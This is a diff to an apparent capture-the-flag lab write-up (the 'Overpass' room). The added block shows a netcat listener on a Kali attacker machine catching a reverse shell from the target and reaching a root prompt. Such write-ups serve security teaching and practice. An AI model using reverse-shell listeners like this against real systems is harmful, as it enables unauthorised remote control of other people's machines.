@@ -757,7 +757,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Check the **netcat listener** on the attacker machine for the reverse shell from the target.
 
-
+```shell
+┌──(kali㉿kali)-[~/CS/THM/Overpass]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.157.156] from (UNKNOWN) [10.66.180.249] 45632
+bash: cannot set terminal process group (2111): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-66-180-249:~# 
+```
 <div align="center">
 <br>
 <br>
